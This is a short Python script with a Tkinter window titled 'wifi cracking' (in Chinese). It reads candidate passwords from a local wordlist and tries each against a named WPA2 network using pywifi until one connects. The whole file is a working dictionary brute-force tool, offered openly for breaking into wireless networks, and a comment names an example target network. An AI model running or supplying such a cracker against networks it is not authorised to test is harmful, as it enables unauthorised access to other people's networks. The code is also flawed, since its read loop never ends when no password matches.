from tkinter import *
from pywifi import const
import pywifi
import time


# 测试连接
def wificonnect(wifiname, password):
    wifi = pywifi.PyWiFi()  # 创建一个无线对象
    ifaces = wifi.interfaces()[0]  # 取第一个无线网卡
    print(ifaces.status)
    if ifaces.status() == 4:
        print("电脑已连接无线")
    else:
        print("电脑未连接无线")

    # 断开所有的wifi
    ifaces.disconnect()
    time.sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED: # 未连接状态，就去尝试连接破解

        profile = pywifi.Profile()# 创建wifi连接文件
        profile.ssid = wifiname # wifi 名字
        profile.akm.append(const.AKM_TYPE_WPA2PSK)# wifi的加密算法
        profile.key = password # wifi的密码
        profile.auth = const.AUTH_ALG_OPEN # 网卡的开发
        # 加密单元,这里需要写点加密单元否则无法连接
        profile.cipher = const.CIPHER_TYPE_CCMP

        # 删除所有的wifi文件
        ifaces.remove_all_network_profiles()
        # 设置新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        # 连接
        ifaces.connect(tep_profile)
        time.sleep(3)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def readPwd():
    # 获取wiif名称
    wifiname = entry.get().strip()

    path = 'C:\\Users\\kunning\\Documents\\2496.txt'
    file = open(path, 'r')
    while True:
        try:
            # 读取
            mystr = file.readline().strip()
            # 测试连接
            bool = wificonnect(wifiname, mystr)
            if bool:
                text.insert(END, '密码正确' + mystr)
                text.see(END)
                text.update()
                file.close()
                break
            else:
                text.insert(END, '密码错误' + mystr)
                text.see(END)
                text.update()
        except:
            continue


# 创建窗口
root = Tk()
root.title('wifi破解')
root.geometry('500x400')

# 标签 ChinaNet-URtt
label = Label(root, text='输入要破解的WIFI名称：')
# 定位
label.grid()
# 输入控件
entry = Entry(root, font=('微软雅黑', 14))
entry.grid(row=0, column=1)
# 列表控件
text = Listbox(root, font=('微软雅黑', 14), width=40, height=10)
text.grid(row=1, columnspan=2)
#  按钮
button = Button(root, text='开始破解', width=20, height=2, command=readPwd)
button.grid(row=2, columnspan=2)

# 显示窗口
root.mainloop()
